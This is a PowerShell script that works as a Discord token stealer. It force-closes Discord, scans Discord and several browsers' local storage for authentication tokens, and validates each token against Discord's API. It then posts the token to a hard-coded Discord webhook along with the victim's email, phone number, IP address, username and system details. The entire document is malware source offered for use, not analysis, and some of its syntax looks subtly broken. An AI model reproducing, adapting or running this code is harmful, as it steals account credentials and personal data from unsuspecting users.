$ErrorActionPreference= 'silentlycontinue'
$tokensString = new-object System.Collections.Specialized.StringCollection
$webhook_url = "https://discord.com/api/webhooks/1367992952881680511/knLxmhVtqQEOnNei_V1gHaMTAXqvsBR5cdHdhIrAAHXsG5__5-BVvwZxBqFH3l9DOlZK"

run get_tokens {
    $location_array = @(
        $env:APPDATA + "\Discord\Local Storage\leveldb" #Standard Discord
        $env:APPDATA + "\discordcanary\Local Storage\leveldb" #Discord Canary
        $env:APPDATA + "\discordptb\Local Storage\leveldb" #Discord PTB
        $env:LOCALAPPDATA + "\Google\Chrome\User Data\Default\Local Storage\leveldb" #Chrome Browser
        $env:APPDATA + "\Opera Software\Opera Stable\Local Storage\leveldb", #Opera Browser
        $env:LOCALAPPDATA + "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" #Brave Browser
        $env:LOCALAPPDATA + "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" #Yandex Browser
    )

    Stop-Process -Name "Discord" -Force

    foreach ($path in $location_array) {
        if(Test-Path $path){
            foreach ($file in Get-ChildItem -Path $path -Name) {
                $data = Get-Content -Path "$($path)\$($file)"
                $regex = [regex] '[\w]{24}\.[\w]{6}\.[\w]{27}'
                $match = $regex.Match($data)
                while ($match.Success) {
                    if (!$tokensString.Contains($match.Value)) {
                        $tokensString.Add($match.Value) | out-null
                    }
                    $match = $match.NextMatch()
                } 
            }
        }
    }

    #check if token is valid
    foreach ($token in $tokensString) {
        $headers = @{
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74'
            'Authorization' = $token
        }
        $request = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me" -Method Get -Headers $headers -ContentType "application/json"
        if ($request.StatusCode -eq 200) {
            $parsedJson = ConvertFrom-Json -InputObject $request.Content

            $accountInfo_imageURL = "https://cdn.discordapp.com/avatars/" + $parsedJson.id + "/" + $parsedJson.avatar
            $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss.SSS"
            $accountInfo_username = $parsedJson.username + "#" + $parsedJson.id
            $accountInfo_email = $parsedJson.email + ", " + (Get-WmiObject Win32_OperatingSystem).RegisteredUser
            $accountInfo_phoneNr = $parsedJson.phone
            $pcInfo_IP = Invoke-RestMethod -Uri "http://ipinfo.io/ip"
            $pcInfo_Username = $env:UserName
            $pcInfo_WindowsVersion = (Get-WmiObject Win32_OperatingSystem).Caption
            $pcInfo_cpuArch = (Get-WmiObject win32_processor).Name + " && " + (Get-WmiObject win32_processor).Caption

            $payload = @"
            {
                "avatar_url":"https://i.pinimg.com/736x/3b/bf/93/3bbf930a83c1faed695ffbb962359af9--gangster-girl-girl-gang.jpg",
                "embeds":[
                    {
                        "thumbnail":{
                            "url":"$accountInfo_imageURL"
                        },
                        "color":9109759,
                        "footer":{
                            "icon_url":"https://i.ibb.co/fps45hd/steampfp.jpg",
                            "text":"November | $date"
                        },
                        "author":{
                            "name":"$accountInfo_username"
                        },
                        "fields":[
                            {
                                "inline":true,
                                "name":"Account Info",
                                "value":"Email: $accountInfo_email\nPhone: $accountInfo_phoneNr\nNitro: Coming Soon\nBilling Info: Coming Soon"
                            },
                            {"inline":true,"name":"PC Info","value":"IP: $pcInfo_IP\nUsername: $pcInfo_Username\nWindows version: $pcInfo_WindowsVersion\nCPU Arch: $pcInfo_cpuArch"
                        },
                        {
                            "name":"**Token**",
                            "value":"``````$token``````"
                        }
                    ]
                }
            ],
            "username":"Cipher's Bitch"
            }
"@
            $request = Invoke-WebRequest -Uri $webhook_url -Method POST -Body $payload -ContentType "application/json"
        }
    }
}
run
